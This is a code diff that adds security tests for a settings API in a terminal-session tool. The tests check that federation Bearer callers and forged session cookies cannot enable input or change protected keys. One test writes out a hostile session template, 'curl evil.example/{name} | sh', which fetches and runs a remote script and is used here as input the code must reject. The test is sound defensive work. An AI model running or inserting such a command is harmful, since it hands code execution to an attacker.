@@ -3495,6 +3495,205 @@ def test_patch_settings_ignores_unknown_keys(client, tmp_path, monkeypatch):
 
 
 # ---------------------------------------------------------------------------
+# PATCH /api/settings -- operator-settable local keys
+# (input_enabled / input_allowed_sessions; see
+# settings.OPERATOR_SETTABLE_LOCAL_KEYS and main.update_settings())
+# ---------------------------------------------------------------------------
+
+
+def test_patch_settings_operator_can_enable_input(client, tmp_path, monkeypatch):
+    """An operator (this fixture's cookie-authenticated client) PATCHing
+    input_enabled: true must persist -- both in the response and on
+    a subsequent load_settings()."""
+    import muxplex.settings as settings_mod
+
+    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
+
+    response = client.patch("/api/settings", json={"input_enabled": True})
+    assert response.status_code == 200
+    assert response.json()["input_enabled"] is True
+
+    assert settings_mod.load_settings()["input_enabled"] is True
+
+
+def test_patch_settings_operator_can_set_input_allowed_sessions(
+    client, tmp_path, monkeypatch
+):
+    """An operator PATCHing input_allowed_sessions: ["foo-*"] must persist,
+    normalized exactly like the pre-existing local-file-edit path."""
+    import muxplex.settings as settings_mod
+
+    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
+
+    response = client.patch("/api/settings", json={"input_allowed_sessions": ["foo-*"]})
+    assert response.status_code == 200
+    assert response.json()["input_allowed_sessions"] == ["foo-*"]
+
+    assert settings_mod.load_settings()["input_allowed_sessions"] == ["foo-*"]
+
+
+def _arm_real_federation_bearer(tmp_path, monkeypatch) -> str:
+    """Wire up a GENUINE federation Bearer credential and return the key.
+
+    Deliberately stubs NOTHING on the auth path -- neither AuthMiddleware nor
+    ``main._bearer_only_caller``. Both real code paths read a real key from
+    their own real source, so a request carrying
+    ``Authorization: Bearer <returned key>`` is authorized by the actual
+    middleware and classified by the actual classifier:
+
+      1. AuthMiddleware's Bearer branch calls ``settings.load_federation_key()``
+         FRESH FROM DISK on every request (auth.py), which honors the
+         ``MUXPLEX_FEDERATION_KEY_FILE`` env override -- so pointing that at a
+         tmp file containing the key is what makes the real middleware ACCEPT
+         the header (without it: 401).
+      2. ``main._bearer_only_caller()`` compares the header against the
+         module-global ``main._federation_key`` (loaded once at import), so
+         that global is set to the same key -- the same mechanism
+         ``test_ws_proxy.py::test_ws_bearer_auth_accepted`` uses.
+    """
+    import muxplex.main as main_mod
+
+    fed_key = "test-federation-key-operator-fence"
+    key_file = tmp_path / "federation_key"
+    key_file.write_text(fed_key)
+    # (1) real AuthMiddleware -> load_federation_key() -> this file
+    monkeypatch.setenv("MUXPLEX_FEDERATION_KEY_FILE", str(key_file))
+    # (2) real _bearer_only_caller() -> this module global
+    monkeypatch.setattr(main_mod, "_federation_key", fed_key)
+    monkeypatch.setenv("MUXPLEX_PASSWORD", "test-password")
+    return fed_key
+
+
+def test_patch_settings_real_bearer_caller_cannot_enable_input(
+    tmp_path, monkeypatch, caplog
+):
+    """SECURITY (genuine end-to-end): a REAL federation-key Bearer request --
+    no cookie, no stubbed classifier -- must be AUTHORIZED by the real
+    AuthMiddleware and then have input_enabled dropped by the real
+    ``_bearer_only_caller`` classification.
+
+    Deliberately does NOT use the ``client`` fixture (which sets a valid
+    session cookie, which would make the caller an operator) and does NOT
+    monkeypatch ``_bearer_only_caller``. The Bearer header is the sole
+    credential, exactly as a federation peer / headless agent presents it.
+    """
+    import logging
+
+    import muxplex.settings as settings_mod
+
+    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
+    fed_key = _arm_real_federation_bearer(tmp_path, monkeypatch)
+
+    with TestClient(app) as c:
+        # Control: with NO credential at all the real middleware 401s. This is
+        # what proves the Bearer header below is genuinely doing the
+        # authorizing -- not that auth is somehow open in this test setup.
+        unauth = c.patch(
+            "/api/settings",
+            json={"input_enabled": True},
+            headers={"Accept": "application/json"},
+        )
+        assert unauth.status_code == 401, (
+            "Expected the real AuthMiddleware to reject a credential-less "
+            f"PATCH with 401, got {unauth.status_code}"
+        )
+
+        with caplog.at_level(logging.WARNING, logger="muxplex.settings"):
+            response = c.patch(
+                "/api/settings",
+                # A syncable key rides along in the SAME patch, so a wholesale
+                # rejection cannot masquerade as a successful fence.
+                json={"input_enabled": True, "sort_order": "alphabetical"},
+                headers={"Authorization": f"Bearer {fed_key}"},
+            )
+
+    # Authorized -- the real middleware accepted the real Bearer header.
+    assert response.status_code == 200, (
+        f"Real Bearer request must be authorized, got {response.status_code}"
+    )
+    data = response.json()
+    # ...but the fenced key was dropped by the real classifier.
+    assert data["input_enabled"] is False
+    # ...while the ordinary syncable key in the same patch DID apply, proving
+    # the request was processed rather than wholesale-rejected.
+    assert data["sort_order"] == "alphabetical"
+
+    loaded = settings_mod.load_settings()
+    assert loaded["input_enabled"] is False, (
+        "A real federation-Bearer caller must NOT be able to enable input"
+    )
+    assert loaded["sort_order"] == "alphabetical"
+
+    # The drop is silent to the HTTP response, but never silent to the log.
+    assert any(
+        "input_enabled" in record.message and "local-only" in record.message
+        for record in caplog.records
+    ), f"Expected a local-only warning log for input_enabled, got: {caplog.records}"
+
+
+def test_patch_settings_forged_cookie_cannot_downgrade_real_bearer_caller(
+    tmp_path, monkeypatch
+):
+    """SECURITY (genuine end-to-end): a FORGED muxplex_session cookie sent
+    ALONGSIDE a real federation-key Bearer header must not launder the caller
+    into operator status.
+
+    The junk cookie fails ``verify_session_cookie`` in BOTH places that read
+    it -- AuthMiddleware (so the request falls through to the Bearer branch
+    and is authorized by the key alone) and ``_bearer_only_caller`` (so the
+    caller stays classified bearer_only) -- therefore input_enabled must
+    still be dropped. Nothing on the auth path is stubbed.
+    """
+    import muxplex.settings as settings_mod
+
+    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
+    fed_key = _arm_real_federation_bearer(tmp_path, monkeypatch)
+
+    with TestClient(app) as c:
+        c.cookies.set("muxplex_session", "forged.not-a-valid-signature.value")
+        response = c.patch(
+            "/api/settings",
+            json={"input_enabled": True, "sort_order": "alphabetical"},
+            headers={"Authorization": f"Bearer {fed_key}"},
+        )
+
+    assert response.status_code == 200, (
+        f"Bearer header must still authorize the request, got {response.status_code}"
+    )
+    data = response.json()
+    assert data["input_enabled"] is False
+    assert data["sort_order"] == "alphabetical"
+
+    loaded = settings_mod.load_settings()
+    assert loaded["input_enabled"] is False, (
+        "A forged cookie must not downgrade a Bearer caller to operator status"
+    )
+    assert loaded["sort_order"] == "alphabetical"
+
+
+def test_patch_settings_operator_still_cannot_set_other_local_only_keys(
+    client, tmp_path, monkeypatch
+):
+    """OPERATOR_SETTABLE_LOCAL_KEYS is narrowly the two input-typing keys --
+    an operator-credentialed PATCH must NOT be able to set any OTHER
+    LOCAL_ONLY_KEYS member (e.g. new_session_template), even though this
+    client is not bearer_only."""
+    import muxplex.settings as settings_mod
+
+    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
+
+    custom = "curl evil.example/{name} | sh"
+    response = client.patch("/api/settings", json={"new_session_template": custom})
+    assert response.status_code == 200
+    data = response.json()
+    assert data["new_session_template"] != custom
+    assert (
+        data["new_session_template"]
+        == settings_mod.DEFAULT_SETTINGS["new_session_template"]
+    )
+
+
+# ---------------------------------------------------------------------------
 # deviceLabelPlacement (docs/plans/2026-08-04-device-label-placement-plan.md, test plan section 8.2)
 # ---------------------------------------------------------------------------
 
